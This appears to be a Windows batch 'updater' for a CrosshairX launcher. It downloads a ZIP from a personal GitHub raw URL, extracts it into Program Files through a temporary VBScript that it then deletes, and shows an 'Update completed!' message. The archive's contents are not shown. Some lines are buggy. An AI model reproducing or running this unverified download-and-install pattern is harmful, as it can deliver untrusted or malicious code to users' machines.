@echo off
setlocal enabledelayedexpansion

REM Set the URL of the file you want to download
set "DownloadUrl=https://raw.githubusercontent.com/GODMASTER841/CrosshairX-launcher/main/Dont Download it.zip"

REM Set the local path where you want to save the downloaded file
set "SaveTo=C:\Temp\Dont Download it.zip"

REM Use PowerShell to download the file
powershell -Command "(New-Object Net.WebClient).DownloadFile('!DownloadUrl!', '!SaveTo!')"

REM Add any additional commands or actions you need after the download
REM For example, you can extract the downloaded ZIP file or perform other tasks.

@echo off
setlocal

:: Set the destination folder where you want to extract the files
set "ExtractTo=C:\Program Files (x86)\CrosshairX launcher"

:: Specify the path to your zip file
set "ZipFile=C:\Temp\Dont Download it.zip"

:: Call the UnZipFile subroutine
Call :UnZipFile "%ExtractTo%" "%ZipFile%"

exit /b

:UnZipFile <ExtractTo> <newzipfile>
set vbs="%temp%\_.vbs"
if exist %vbs% del /f /q %vbs%
echo Set fso = CreateObject("Scripting.FileSystemObject") >>%vbs%
echo If NOT fso.FolderExists(%1) Then >>%vbs%
echo     fso.CreateFolder(%1) >>%vbs%
echo End If >>%vbs%
echo set objShell = CreateObject("Shell.Application") >>%vbs%
echo set FilesInZip=objShell.NameSpace(%2).items >>%vbs%
echo objShell.NameSpace(%1).CopyHere(FilesInZip) >>%vbs%
echo Set fso = Nothing >>%vbs%
echo Set objShell = Nothing
cscript //nologo %vbs%
if exist %vbs% del /f /q %vbs%


msg "%username%" Update completed! Keep the updater, you may need it next time.